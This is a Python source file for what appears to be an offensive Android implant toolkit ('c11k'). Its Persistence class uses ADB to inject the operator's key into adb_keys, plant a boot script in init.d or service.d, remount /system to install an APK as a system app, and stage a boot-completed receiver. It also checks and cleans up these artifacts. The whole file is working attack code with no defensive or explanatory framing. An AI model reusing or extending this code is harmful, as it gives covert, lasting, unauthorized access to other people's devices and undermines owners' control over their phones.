import os
from pathlib import Path
from typing import List, Optional, Dict, Any

class Persistence:
    def __init__(self, config: dict, adb_handler):
        self.config = config
        self.adb = adb_handler
        self.persistence_config = config.get("persistence", {})
        self.methods = self.persistence_config.get("methods", ["adb_key_injection", "init_d_script", "system_app_install"])
        self.reboot_persist = self.persistence_config.get("reboot_persist", True)

    def inject_adb_key(self, device_serial: str = None) -> bool:
        adb_keys_path = "/data/misc/adb/adb_keys"
        public_key_path = os.path.expanduser("~/.android/adbkey.pub")
        if not os.path.exists(public_key_path):
            self._generate_adb_key()
        if not os.path.exists(public_key_path):
            return False
        with open(public_key_path, "r") as f:
            public_key = f.read().strip()
        cmd = f"echo '{public_key}' >> {adb_keys_path}"
        stdout, stderr, code = self.adb.shell(cmd, device_serial)
        return code == 0

    def _generate_adb_key(self) -> bool:
        key_dir = os.path.expanduser("~/.android")
        os.makedirs(key_dir, exist_ok=True)
        try:
            import subprocess
            subprocess.run(["adb", "keygen", f"{key_dir}/adbkey"], check=True, capture_output=True)
            return True
        except Exception:
            return False

    def setup_init_d_script(self, script_content: str, script_name: str = "c11k_persist.sh", device_serial: str = None) -> bool:
        remote_path = f"/data/local/tmp/{script_name}"
        self.adb.push("/dev/null", remote_path, device_serial)
        cmd = f"echo '{script_content}' > {remote_path}"
        stdout, stderr, code = self.adb.shell(cmd, device_serial)
        if code != 0:
            return False
        self.adb.shell(f"chmod 755 {remote_path}", device_serial)
        init_d_paths = ["/etc/init.d/", "/system/etc/init.d/", "/data/adb/service.d/"]
        for path in init_d_paths:
            check_cmd = f"test -d {path} && echo 'exists'"
            stdout, stderr, code = self.adb.shell(check_cmd, device_serial)
            if "exists" in stdout:
                dest_path = f"{path}{script_name}"
                self.adb.shell(f"cp {remote_path} {dest_path}", device_serial)
                self.adb.shell(f"chmod 755 {dest_path}", device_serial)
                return True
        return False

    def install_as_system_app(self, apk_path: str, device_serial: str = None) -> bool:
        if not os.path.exists(apk_path):
            return False
        self.adb.root(device_serial)
        self.adb.shell("mount -o rw,remount /system", device_serial)
        remote_apk = "/system/app/c11k_app.apk"
        if self.adb.push(apk_path, remote_apk, device_serial):
            self.adb.shell(f"chmod 644 {remote_apk}", device_serial)
            self.adb.reboot("system", device_serial)
            return True
        return False

    def create_boot_complete_receiver(self, package_name: str = "com.c11k.agent", service_name: str = "com.c11k.agent.BootReceiver", device_serial: str = None) -> bool:
        receiver_code = f'''
<receiver android:name="{service_name}">
    <intent-filter>
        <action android:name="android.intent.action.BOOT_COMPLETED" />
        <action android:name="android.intent.action.QUICKBOOT_POWERON" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
</receiver>
'''
        manifest_path = "/data/local/tmp/AndroidManifest.xml"
        self.adb.shell(f"echo '{receiver_code}' > {manifest_path}", device_serial)
        return True

    def apply_all(self, device_serial: str = None, script_content: str = None, apk_path: str = None) -> Dict[str, bool]:
        results = {}
        for method in self.methods:
            if method == "adb_key_injection":
                results["adb_key_injection"] = self.inject_adb_key(device_serial)
            elif method == "init_d_script":
                if script_content is None:
                    script_content = "#!/system/bin/sh\nwhile true; do sleep 60; done"
                results["init_d_script"] = self.setup_init_d_script(script_content, device_serial=device_serial)
            elif method == "system_app_install":
                if apk_path and os.path.exists(apk_path):
                    results["system_app_install"] = self.install_as_system_app(apk_path, device_serial)
                else:
                    results["system_app_install"] = False
            else:
                results[method] = False
        return results

    def check_persistence(self, device_serial: str = None) -> Dict[str, bool]:
        status = {}
        check_paths = [
            "/data/misc/adb/adb_keys",
            "/system/app/c11k_app.apk",
            "/data/adb/service.d/c11k_persist.sh"
        ]
        for path in check_paths:
            stdout, stderr, code = self.adb.shell(f"test -f {path} && echo 'exists'", device_serial)
            status[path] = "exists" in stdout
        return status

    def cleanup(self, device_serial: str = None) -> bool:
        paths_to_remove = [
            "/system/app/c11k_app.apk",
            "/data/adb/service.d/c11k_persist.sh",
            "/data/local/tmp/c11k_persist.sh"
        ]
        for path in paths_to_remove:
            self.adb.shell(f"rm -f {path}", device_serial)
        return True